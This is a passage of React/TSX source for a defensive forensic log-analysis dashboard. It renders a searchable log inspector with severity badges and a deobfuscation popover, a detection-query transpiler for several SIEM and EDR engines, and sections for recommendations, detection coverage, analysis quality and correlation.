                      <span className="text-muted-foreground">Disables compromised accounts and enforces full command-line audit logging policies.</span>
                    </div>
                  </div>
                </div>
              </Panel>
            )}

            {activeTab === "inspector" && (
              <Panel title={`Forensic Log Inspector (${rawLines.length} Total Lines)`}>
                <div className="space-y-2.5">
                  {/* Inspector Controls */}
                  <div className="flex flex-wrap items-center justify-between gap-2 rounded border border-border/60 bg-surface-1 p-2">
                    <div className="flex items-center gap-2 flex-1 min-w-[200px]">
                      <Search className="h-3.5 w-3.5 text-muted-foreground" />
                      <input
                        type="text"
                        value={inspectorSearch}
                        onChange={(e) => setInspectorSearch(e.target.value)}
                        placeholder="Search logs... (e.g. 4625, Administrator, powershell, svchost)"
                        className="h-7 w-full rounded border border-divider-strong bg-surface-0 px-2 font-mono ba-text-2xs text-foreground placeholder:text-fg-dim/60 focus:border-primary/50 focus:outline-none"
                      />
                      {inspectorSearch && (
                        <button onClick={() => setInspectorSearch("")} className="text-muted-foreground hover:text-foreground">
                          <X className="h-3 w-3" />
                        </button>
                      )}
                    </div>

                    <div className="flex items-center gap-2">
                      {/* Filter All vs Matched */}
                      <div className="flex items-center rounded border border-subtle bg-surface-0 p-0.5 text-mono ba-text-3xs">
                        <button
                          onClick={() => setInspectorFilter("all")}
                          className={`rounded px-2 py-0.5 transition-colors ${
                            inspectorFilter === "all"
                              ? "bg-primary/20 text-primary font-semibold"
                              : "text-muted-foreground hover:text-foreground"
                          }`}
                        >
                          All ({rawLines.length})
                        </button>
                        <button
                          onClick={() => setInspectorFilter("matched")}
                          className={`rounded px-2 py-0.5 transition-colors ${
                            inspectorFilter === "matched"
                              ? "bg-destructive/20 text-destructive font-semibold"
                              : "text-muted-foreground hover:text-foreground"
                          }`}
                        >
                          Matched ({matchesByLine.size})
                        </button>
                      </div>

                      {/* Jump to Line Form */}
                      <div className="flex items-center gap-1 text-mono ba-text-2xs">
                        <span className="text-muted-foreground">Jump:</span>
                        <input
                          type="number"
                          min={1}
                          max={rawLines.length}
                          value={jumpInput}
                          onChange={(e) => setJumpInput(e.target.value)}
                          onKeyDown={(e) => {
                            if (e.key === "Enter" && jumpInput) {
                              jumpToLine(parseInt(jumpInput, 10));
                            }
                          }}
                          placeholder="L#"
                          className="h-7 w-14 rounded border border-divider-strong bg-surface-0 px-1.5 text-center font-mono ba-text-2xs text-foreground focus:border-primary/50 focus:outline-none"
                        />
                        <button
                          onClick={() => {
                            if (jumpInput) jumpToLine(parseInt(jumpInput, 10));
                          }}
                          className="rounded border border-subtle bg-surface-0 px-2 py-1 text-mono ba-text-3xs text-muted-foreground hover:text-foreground"
                        >
                          Go
                        </button>
                      </div>
                    </div>
                  </div>

                  {/* Lines List View */}
                  <div className="max-h-[550px] overflow-y-auto rounded border border-divider bg-surface-0 font-mono ba-text-2xs">
                    {filteredInspectorLines.length === 0 ? (
                      <div className="py-8 text-center text-muted-foreground">
                        No lines match the current filter.
                      </div>
                    ) : (
                      filteredInspectorLines.map(({ lineNum, text }) => {
                        const matches = matchesByLine.get(lineNum);
                        const isHighlighted = highlightedLine === lineNum;
                        const hasDeob = detectAndDeobfuscate(text);

                        return (
                          <div
                            key={lineNum}
                            id={`log-inspector-line-${lineNum}`}
                            onClick={() => setHighlightedLine(lineNum)}
                            className={`group flex items-start gap-2 border-b border-border/30 px-2.5 py-1.5 transition-colors ${
                              isHighlighted
                                ? "bg-primary/15 border-l-4 border-l-primary"
                                : matches
                                ? "bg-destructive/5 hover:bg-surface-1"
                                : "hover:bg-surface-1"
                            }`}
                          >
                            {/* Line Number */}
                            <div
                              className={`w-10 shrink-0 select-none text-right font-mono ba-text-3xs ${
                                isHighlighted
                                  ? "font-bold text-primary"
                                  : matches
                                  ? "text-destructive font-medium"
                                  : "text-fg-dim"
                              }`}
                            >
                              {lineNum}
                            </div>

                            {/* Gutter Badge */}
                            <div className="w-16 shrink-0">
                              {matches && matches[0] && (
                                <Chip
                                  tone={
                                    matches[0].rule.severity === "critical" || matches[0].rule.severity === "high"
                                      ? "destructive"
                                      : matches[0].rule.severity === "medium"
                                      ? "warning"
                                      : "info"
                                  }
                                >
                                  {matches[0].rule.severity}
                                </Chip>
                              )}
                            </div>

                            {/* Content & Rules */}
                            <div className="min-w-0 flex-1 break-all text-foreground leading-relaxed">
                              <span>{text || <span className="text-fg-dim italic">&lt;empty&gt;</span>}</span>
                              {matches && (
                                <div className="mt-1 flex flex-wrap items-center gap-1.5">
                                  {matches.map((m, mi) => (
                                    <span
                                      key={mi}
                                      className="rounded bg-destructive/10 px-1.5 py-0.5 text-mono ba-text-3xs text-destructive"
                                    >
                                      {m.rule.title}
                                    </span>
                                  ))}
                                </div>
                              )}
                            </div>

                            {/* Inline Deobfuscation Popover Trigger */}
                            {hasDeob && (
                              <div className="shrink-0">
                                <DecodedPayloadPopover rawText={text} />
                              </div>
                            )}
                          </div>
                        );
                      })
                    )}
                  </div>
                </div>
              </Panel>
            )}

            {activeTab === "iocs" && (
              <IOCTable iocs={analysis.iocs} source="/logs" />
            )}

            {activeTab === "timeline" && (
              <TimelinePanel
                events={analysis.logSummary.timeline.map(t => ({
                  line: t.line,
                  severity: t.severity,
                  label: t.label,
                }))}
                onSelectLine={(line) => jumpToLine(line)}
              />
            )}

            {activeTab === "mitre" && (
              <MitrePanel techniques={analysis.mitre} />
            )}

            {activeTab === "transpiler" && translatedQueries && (
              <Panel title="Multi-Engine Detection & Hunting Query Transpiler">
                <div className="space-y-3">
                  <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border/60 pb-2.5">
                    <p className="text-mono ba-text-2xs text-fg-dim">
                      Transpile detected attack patterns, extracted IOCs, and MITRE techniques into enterprise SIEM and EDR query rules.
                    </p>
                    <div className="flex items-center gap-2">
                      <button
                        onClick={() => {
                          const fileMap: Record<string, { ext: string; content: string }> = {
                            sigma: { ext: "yml", content: translatedQueries.sigmaYaml },
                            splunk: { ext: "spl", content: translatedQueries.splunkSpl },
                            elastic: { ext: "kql", content: translatedQueries.elasticKql },
                            sentinel: { ext: "kql", content: translatedQueries.sentinelKql },
                            vql: { ext: "vql", content: translatedQueries.velociraptorVql },
                          };
                          const target = fileMap[transpilerEngine];
                          const blob = new Blob([target.content], { type: "text/plain" });
                          const url = URL.createObjectURL(blob);
                          const a = document.createElement("a");
                          a.href = url;
                          a.download = `detection-rule-${transpilerEngine}-${Date.now()}.${target.ext}`;
                          a.click();
                          URL.revokeObjectURL(url);
                          toast.success(`Downloaded ${transpilerEngine.toUpperCase()} rule`);
                        }}
                        className="inline-flex items-center gap-1 rounded border border-subtle bg-surface-1 px-2.5 py-1 text-mono ba-text-2xs text-fg-dim hover:text-foreground transition-colors duration-150"
                      >
                        <Download className="h-3 w-3" /> Download
                      </button>
                      <button
                        onClick={() => {
                          const contentMap = {
                            sigma: translatedQueries.sigmaYaml,
                            splunk: translatedQueries.splunkSpl,
                            elastic: translatedQueries.elasticKql,
                            sentinel: translatedQueries.sentinelKql,
                            vql: translatedQueries.velociraptorVql,
                          };
                          copyText(contentMap[transpilerEngine]);
                          setCopiedQuery(true);
                          toast.success(`Copied ${transpilerEngine.toUpperCase()} query to clipboard`);
                          setTimeout(() => setCopiedQuery(false), 2000);
                        }}
                        className="inline-flex items-center gap-1 rounded border border-primary/40 bg-primary/10 px-2.5 py-1 text-mono ba-text-2xs text-primary hover:bg-primary/20 transition-colors duration-150"
                      >
                        {copiedQuery ? <Check className="h-3 w-3 text-success" /> : <Copy className="h-3 w-3" />}
                        {copiedQuery ? "Copied!" : "Copy Query"}
                      </button>
                    </div>
                  </div>

                  {/* Engine Switcher */}
                  <div className="flex flex-wrap gap-1 border-b border-border/60 pb-1">
                    {[
                      { id: "sigma" as const, label: "Sigma HQ (YAML)", icon: Layers },
                      { id: "splunk" as const, label: "Splunk (SPL)", icon: Terminal },
                      { id: "elastic" as const, label: "Elastic (KQL)", icon: Code2 },
                      { id: "sentinel" as const, label: "Sentinel (KQL)", icon: Shield },
                      { id: "vql" as const, label: "Velociraptor (VQL)", icon: Terminal },
                    ].map((engine) => (
                      <button
                        key={engine.id}
                        onClick={() => setTranspilerEngine(engine.id)}
                        className={
                          "inline-flex items-center gap-1.5 rounded-t px-3 py-1.5 text-mono ba-text-2xs transition-colors duration-150 " +
                          (transpilerEngine === engine.id
                            ? "border-b-2 border-primary bg-surface-2 text-primary font-semibold"
                            : "text-fg-dim hover:text-foreground")
                        }
                      >
                        <engine.icon className="h-3.5 w-3.5" />
                        {engine.label}
                      </button>
                    ))}
                  </div>

                  {/* Code Display */}
                  <div className="relative rounded border border-divider bg-surface-0 p-3 font-mono ba-text-2xs">
                    <pre className="max-h-96 overflow-y-auto whitespace-pre-wrap leading-relaxed text-foreground">
                      {transpilerEngine === "sigma" && translatedQueries.sigmaYaml}
                      {transpilerEngine === "splunk" && translatedQueries.splunkSpl}
                      {transpilerEngine === "elastic" && translatedQueries.elasticKql}
                      {transpilerEngine === "sentinel" && translatedQueries.sentinelKql}
                      {transpilerEngine === "vql" && translatedQueries.velociraptorVql}
                    </pre>
                  </div>
                </div>
              </Panel>
            )}

            <EntitySection title="Recommendations" icon={ShieldCheck} meta={`${analysis.recommendations.length} open · engine`}>
              {analysis.recommendations.length === 0 ? (
                <p className="text-mono ba-text-sm text-muted-foreground">No open recommendations.</p>
              ) : (
                <div className="space-y-2">
                  {analysis.recommendations.map((rec) => (
                    <div key={rec.id} className="flex items-start gap-2.5 rounded-md border border-subtle bg-surface-1 px-3 py-2.5">
                      <Chip tone={rec.priority === "high" ? "destructive" : rec.priority === "medium" ? "warning" : "info"}>{rec.kind}</Chip>
                      <div className="min-w-0 flex-1">
                        <div className="text-mono ba-text-sm text-foreground">{rec.statement}</div>
                        <p className="mt-0.5 ba-text-2xs text-muted-foreground">{rec.reason} · {rec.evidenceRefs.length} evidence ref{rec.evidenceRefs.length === 1 ? "" : "s"}</p>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </EntitySection>

            {analysis.opportunities.length > 0 && (
              <EntitySection title="Detection Coverage" icon={Crosshair} meta={`${analysis.opportunities.length} technique${analysis.opportunities.length === 1 ? "" : "s"} · engine`}>
                <div className="space-y-2">
                  {analysis.opportunities.map((o) => (
                    <div key={o.id} className="rounded-md border border-subtle bg-surface-1 px-3 py-2.5">
                      <div className="flex flex-wrap items-center gap-2">
                        <span className="text-mono ba-text-2xs font-semibold text-destructive">{o.technique}</span>
                        <Chip tone={o.coverage === "detected" ? "success" : o.coverage === "gap" ? "warning" : "info"}>{o.coverage}</Chip>
                        <Chip tone="primary">{o.priority}</Chip>
                      </div>
                      <p className="mt-1 ba-text-2xs leading-relaxed text-muted-foreground">{o.behavior}</p>
                      {o.existingRule && <p className="mt-1 text-mono ba-text-3xs text-fg-dim">existing rule · {o.existingRule}</p>}
                      {o.suggestedHunt && <p className="mt-1 text-mono ba-text-3xs text-fg-dim">hunt · {o.suggestedHunt}</p>}
                      {o.suggestedRule && (
                        <pre className="mt-2 overflow-x-auto rounded border border-subtle bg-surface-0 p-2 text-mono ba-text-3xs text-fg-dim">{o.suggestedRule.draft}</pre>
                      )}
                    </div>
                  ))}
                </div>
              </EntitySection>
            )}

            <EntitySection title="Analysis Quality" icon={Activity} meta={`coverage ${Math.round((analysis.quality.coverage.score ?? 0) * 100)}%`}>
              <div className="grid gap-2 grid-cols-2">
                <div className="rounded-md border border-subtle bg-surface-1 px-3 py-2.5">
                  <div className="text-mono ba-text-2xs text-muted-foreground">coverage score</div>
                  <div className="mt-1 text-mono ba-text-xl font-semibold text-foreground">{Math.round((analysis.quality.coverage.score ?? 0) * 100)}%</div>
                  <div className="mt-1.5 flex flex-wrap gap-1">
                    {analysis.quality.coverage.gaps.length === 0 ? (
                      <Chip tone="success">all evidence categories covered</Chip>
                    ) : (
                      analysis.quality.coverage.gaps.map((g) => <Chip key={g} tone="info">{g}</Chip>)
                    )}
                  </div>
                </div>
                <div className="rounded-md border border-subtle bg-surface-1 px-3 py-2.5">
                  <div className="text-mono ba-text-2xs text-muted-foreground">recommended next step</div>
                  <p className="mt-1 ba-text-sm text-foreground">{analysis.quality.recommendedNextStep}</p>
                  {analysis.quality.weakSignals.length > 0 && (
                    <p className="mt-1.5 text-mono ba-text-3xs text-fg-dim">weak signals · {analysis.quality.weakSignals.join(", ")}</p>
                  )}
                </div>
              </div>
            </EntitySection>

            <EntitySection title="Correlation" icon={Workflow} meta={`${analysis.correlation.length} matches · local history`}>
              {analysis.correlation.length === 0 ? (
                <p className="text-mono ba-text-sm text-muted-foreground">
                  No prior-case, detection, or intel-corpus matches in the local case/detection/entity corpus. Findings above are unaffected.
                </p>
              ) : (
                <div className="space-y-2">
                  {analysis.correlation.map((m) => (
                    <div key={`${m.dimension}-${m.value}`} className="rounded-md border border-subtle bg-surface-1 px-3 py-2.5">
                      <div className="flex flex-wrap items-center gap-2">
                        <Chip tone="info">{m.dimension}</Chip>
                        <span className="text-mono ba-text-sm text-foreground">{m.value}</span>
                        <Chip tone="primary">{Math.round(m.confidence * 100)}%</Chip>
                      </div>
                      <p className="mt-1 text-mono ba-text-3xs text-fg-dim">{m.label} · {m.matches.map((x) => x.label).join(", ")}</p>
                    </div>
                  ))}
                </div>
              )}
              {analysis.correlationRelationships.length > 0 && (
                <p className="mt-2 text-mono ba-text-3xs text-muted-foreground">{analysis.correlationRelationships.length} graph relationship(s) queued with origin=correlation for analyst review.</p>
              )}
            </EntitySection>
          </>
        )}
      </AnalyzerShell>
    </PageShell>
    </ErrorBoundary>
  );
}
